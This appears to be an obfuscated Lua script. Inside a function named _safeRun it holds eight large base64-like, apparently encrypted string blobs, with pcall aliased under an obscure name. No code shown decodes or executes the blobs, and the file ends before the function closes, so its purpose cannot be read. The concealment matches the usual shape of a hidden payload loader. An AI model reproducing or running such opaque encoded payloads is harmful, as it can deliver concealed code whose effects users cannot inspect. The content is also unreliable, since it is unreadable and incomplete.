local _xkv = pcall
local _tmp = nil
local _bpy = ""

local function _safeRun()
  local _b0 = "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"
  local _b1 = "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"
  local _b2 = "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"
  local _b3 = "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"
  local _b4 = "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"
  local _b5 = "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"
  local _b6 = "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"
  local _b7 = "b1d3UEuFthHqgRR4KcLumsXCmLrvV9hdw41qWMXusu0/LTJG83LwgDtj9knFTBCUg2Ltt5kBb+hEF1HPb55MuskIcBRtpuhogCrmt+Iyw9K1mq6swfIsim1mjBBfYHvdjRWZa7YFxyc7ln4rFYjr370tXntPURGJkG/yXdi7XnSZnZF96QbKrGjbWagWQH+rOOvcLHeJkcAjM/bo1v4Bh2CoLYm5sc9v24Q7tME8Wz89C/CmElG0mQ9T59ZUoFhtZHwH690N+7ochTVyTranh4XVDgqyrSOlWAKL1GZBZPnaro4b/Sm1/oGeIUDY+sdL8cYyUqRErKi/p7T2d5vZUQm4hKk2HqwXAHjszsw5xItjq1YbRcB8WN1sLD6hIF/GazegmZmK+sHHnvaSslEINfEtrqub9gtQB/KpriubAWDyDR6CYDQ5jB+U7rCncZKgsFdSUSCPSh8KKrh6yXk6tCtSvJTLe0MtYQ6Ws9cvejj5lTkj02yzgiI+GoxIa6XMYEt4MlcTlxS6+PJytH6/oKrNED6PoaZEJzFOosuZLOsGhunPER50pGEMTWlZBurMhh0gWgtqqCn9UfyOFgWZDgnUYmPh/GLdG/1cu7k2DwnkpEhz1yGz+UA6803CyQ2ViZ1qWEBaYZ0qukNGxGIsf60IEK+FUCK27ZsM3DZyb0xM8xXrphEk0eoqDplctP9SIG9bHxb79qLvQY8VxkxGvu1zcIOU3N6CxYQMq45zUqYCEQt32nDkFLxmIP4Buh8u4q2B6IZbFmmV6PtHhJUDZuYZudpIPOHbiUTkh3MLadKdtrtKLpOrh9wtlft76a1QeM6tRRAK48CGWKKSA6xKZkmCwfk6QmAAizeH2zJf6tq3Tkq0pOhvTz7g2RlDW9Oqlyt7NQpUywcS3gC+xuz8zoEmVR38Y4OV9XGGvrowAWC6JdQ1DFOmMegl4W8DSYelmtqunX+uwp6imjCwj+w8qraCQjoT36G7zWf5zWSwnd0dZ9bpKx13FD1gs3Q8oZ4RW2ZOAtfKLR4aI9icB52YIc/ujOWhX3TksPvn5GOxwjOudNqmcK87lkjSsSq/YOc4xH/LcVdp6HbwxZcNFj4TXTUiSlg3lFvHPEMXF5NdNCmB8WyjNM1TCp1gc7MqgbDhULJYpmFEnXW49ulyxEk02otDf+uTLgMKxBhmsXAz5wu10kn0mjLHpCcB+YPL653j5jpw9HoYs0SlhWLyYK+OBuVDqhNyjrw2sIl5hn2XwHbWQHWAc5eSCdgH6N5ADO+FNBSevnsumAmJ8LyYMGVjpS4WYgoL8+HAA9epPjr97a9anadxfQk7eCMewFPbeTu6VQOyXs+4DV65M4BIogNtvIyZifUboOu7YjuLmtklk0E7oBRPmU+da565g+w/RiIWLU5JMWLPfhOEqJfWHbnDKb5OPp39xmHddf1Am5Vy2HYV3rBM2ElDeRa+zXWRM97hPh3J67HRHOsDghnq7ex+WYM6gyFnz/HIk86JAez+LNRELQjH4ybzRQJQCdLKR9BbZRiTuHO9LJVllxtP5ukFa3FmCvoXCYsN8lwV0gwXiSg43ouijSl5O/fhcAj1pNnXdzQC+HNwrk2+MoGqwID5SLOrbq3Q6qisEIpfAiIX79c/9qj5LTxskUTHS7iFrNbr7QLOyF1uBMtFP7c23YN4bmKJHdMPOdentWMyj6WRdaiAi8